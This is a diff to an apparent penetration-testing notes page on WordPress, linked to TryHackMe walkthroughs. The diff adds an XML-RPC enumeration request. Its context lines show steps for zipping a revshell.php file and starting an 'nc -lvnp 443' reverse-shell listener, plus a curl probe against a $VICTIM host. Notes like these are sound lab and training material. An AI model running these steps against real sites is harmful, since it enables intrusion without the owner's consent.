@@ -38,7 +38,7 @@ curl http://$VICTIM/wp-content/plugins/akismet/akismet.php
 
 **Examples**&#x20;
 
-[mr-robot-ctf.md](../../walkthroughs/tryhackme/mr-robot-ctf.md "mention")
+[mr-robot-ctf.md](../../walkthroughs/tryhackme/mr-robot-ctf.md "mention")[retro.md](../../walkthroughs/tryhackme/retro.md "mention")
 
 **revshell.php code**
 
@@ -55,4 +55,37 @@ vi revshell.php
 zip revshell.zip revshell.php
 nc -lvnp 443
 ```
+
+
+
+
+
+## XML-RPC
+
+### Check if it is enabled
+
+**Examples**
+
+[retro.md](../../walkthroughs/tryhackme/retro.md "mention")
+
+wpscan or a scan maybe able identified that xmlrpc.php exists, if it is check if it is enabled.
+
+```
+POST /$SITE/xmlrpc.php HTTP/1.1
+Host: $VICTIM
+Content-Length: 91
+
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+```
+
+<figure><img src="../../.gitbook/assets/image (19) (2).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+
 
